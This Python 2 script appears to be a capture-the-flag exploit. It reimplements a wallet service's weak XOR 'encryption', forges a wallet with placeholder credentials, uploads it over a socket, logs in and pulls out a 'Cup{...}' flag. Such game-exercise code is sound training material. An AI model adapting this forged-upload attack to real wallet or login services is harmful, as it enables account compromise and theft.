import sys
import socket
import random
import struct
import re

p32 = lambda val : struct.pack( "!L", val )
u32 = lambda val : struct.unpack( "!L", val )[ 0 ]

BLANCE_KEY = 0xdeadbeef
templates = ['debiting from this account %d arbc to %s account', 
'crediting from %s to a wallet %d arbc']

alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'

def idg( size = 16, chars = alph ):
	return ''.join( random.choice( chars ) for _ in range( size ) )


def recv_all_t( fd, timeout ):
	fd.settimeout( timeout )
	
	res = ''

	while 1:
		try:
			res += fd.recv( 1024 )
		except:
			fd.settimeout( 70 )
			return res

def GenRandomValue( seed ): 
    return (seed >> 1) & 0xff

def GenGamma( seed, sz ):
    gamma = []

    for i in range( 0, sz ):
        value = GenRandomValue( seed )
        seed += value
        gamma.append( value )

    return gamma

def XorStringWithRandomGamma( string ):
	res = ''

	seed = len( string )
	gamma = GenGamma( seed, seed )

	for i in range( len( gamma ) ):
		res += chr( ord( string[ i ] ) ^ gamma[ i ] )

	return res 

class Wallet:
	login = None
	password = None
	balance = None
	last_operations = []
	info = None

	def __init__( self, Username, Password, Info ):
		self.login = Username
		self.password = Password
		self.balance = 13371337
		self.gen_random_operations()

		self.info = Info

	def gen_random_operations( self ):
		global templates
		for i in range( 0, 17 ):

			template_id = random.randint( 0, 1 )

			if template_id == 0:
				self.last_operations.append( templates[ template_id ] 
					% ( random.randint( 100, 512 ), idg() ) )
			else:
				self.last_operations.append( templates[ template_id ]
				 % (  idg(), random.randint( 100, 512 ) ) )

	def pack_operations( self ):
		for i in range( len( self.last_operations ) ):			
			operation = list( self.last_operations[ i ] )

			for j in range( len( operation ) ):
				operation[ j ] = chr( ord( operation[ j ] ) ^ len( operation ) ) 

			self.last_operations[ i ] = ''.join( operation )

	def pack_info( self, key ):
		self.info = list( self.info )

		for i in range( len( self.info ) ):
			self.info[ i ] = chr( ord( self.info[ i ] ) ^ ord( key[ i % len( key ) ] ) )

		self.info = ''.join( self.info ) 

	def pack_wallet( self ):
		self.pack_operations()

		res = ''
		# pack login and password
		res += chr( len( self.login ) )
		res += XorStringWithRandomGamma( self.login )
		res += chr( len( self.password ) )
		res += XorStringWithRandomGamma( self.password )

		# write balance
		res += p32( self.balance ^ BLANCE_KEY )

		# pack all operations
		if len( self.last_operations ) > 0:
			res += chr( len( self.last_operations ) )

			for operation in self.last_operations:
				res += chr( len( operation ) )
				res += operation
		else:
			res += "\x00\x00\x00\x00"

		self.pack_info( self.login + self.password )

		# pack info
		if len( self.info ) > 0:
			res += chr( len( self.info ) )

			res += self.info
		else:
			res += "\x00\x00\x00\x00"

		return res.encode( 'hex' )

if __name__ == "__main__":

	if len( sys.argv ) > 2:
		host = sys.argv[ 1 ]
		port = int( sys.argv[ 2 ] )
	else:
		print "Usage: python " + sys.argv[ 0 ] + " <host> <port>"
		sys.exit( -1 )

	login = 'AAAABBBBCCCCDDDD'
	password = login * 2

	wallet = Wallet( login, password, 'Private' )
	enc_wallet = wallet.pack_wallet()

	sock = socket.socket()

	try:
		sock.connect( ( host, port ) )
	except Exception as e:
		print "[-] Connection error!"
		print "[-] Err: %s" % e

	#print sock.recv( 2048 )
	sock.send( "2\n" ) # upload wallet

	#print sock.recv( 2048 )
	sock.send( enc_wallet + '\n' ) # send wallet data

	#print sock.recv( 2048 )
	sock.send( login + '\n' ) # send login 

	#print sock.recv( 2048 )
	sock.send( password + '\n' ) # send password
	
	#print recv_all_t( sock, 0.2 )
	sock.send( "Y\n" )

	#print sock.recv( 2048 )
	sock.send( "3\n" )

	data = recv_all_t( sock, 0.2 )
	
	print re.findall( 'Cup{.*}', data )[ 0 ]

	sock.close()	
